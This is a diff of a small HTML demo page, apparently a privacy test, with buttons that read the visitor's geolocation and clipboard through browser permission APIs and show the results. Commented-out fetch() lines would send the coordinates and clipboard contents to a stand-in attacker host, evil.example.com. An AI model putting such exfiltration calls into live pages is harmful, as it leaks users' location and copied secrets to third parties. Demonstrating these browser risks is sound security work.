@@ -6,33 +6,35 @@
     <title>Document</title>
 </head>
 <body>
+    <button id="geolocation-test-button">位置情報の取得のテスト</button>
+    <button id="clipboard-test-button">クリップボードの取得のテスト</button>
+    <pre id="log"></pre>
+
     <script>
-        /*
-        async function clipboardTest(){
-            try {
-                const permission = await navigator.permissions.query({
-                    name: "clipboard-read",
-                });
-                if(permission.state == "granted") {
-                    let content = await navigator.clipboard.readText();
-                    console.log(content);
-                    // fetch('https://evil.example.com/clipboard.php?content=' + content)
-                } else {
-                    console.log("denied");
-                }
-            } catch(error) {
-                console.error(error);
-            }
+        const geoBtn = document.querySelector("#geolocation-test-button");
+        const clipBtn = document.querySelector("#clipboard-test-button");
+        geoBtn.addEventListener('click', () => { geolocationTest() })
+        clipBtn.addEventListener('click', () => { clipboardTest() })
+
+        function log (logString){
+            const logElement = document.querySelector("#log");
+            logElement.innerText += logString + '\n';
         }
-        */
 
         async function geolocationTest(){
+            log('Geolocation Test Invoked');
             try {
                 const permission = await navigator.permissions.query({
                     name: "geolocation",
                 });
-                if(permission.state == "granted"){
-                    navigator.geolocation.getCurrentPosition((g) => {console.log(g)});
+                console.log(permission.state)
+                if(permission.state == "prompt" || permission.state == "granted"){
+                    navigator.geolocation.getCurrentPosition((geo) => {
+                        console.log(geo);
+                        log('Latitude: ' + geo.coords.latitude);
+                        log('Longitude: ' + geo.coords.longitude);
+                        // fetch(`https://evil.example.com/geolocation?lat=${geo.coords.latitude}&lon=${geo.coords.longitude}`);
+                    });
                 } else {
                     console.log(permission.state)
                 }
@@ -41,7 +43,25 @@
             }
         }
 
-        geolocationTest();
+        async function clipboardTest(){
+            log('Clipboard Test Invoked');
+            try {
+                const permission = await navigator.permissions.query({
+                    name: "clipboard-read",
+                });
+                console.log(permission.state)
+                if(permission.state == "prompt" || permission.state == "granted"){
+                    let content = await navigator.clipboard.readText();
+                    console.log(content);
+                    log('Clipboard: "' + content + '"');
+                    // fetch(`https://evil.example.com/clipboard?content=${content}`);
+                } else {
+                    console.log(permission.state);
+                }
+            } catch(error){
+                console.log(error);
+            }
+        }
     </script>
 </body>
 </html>
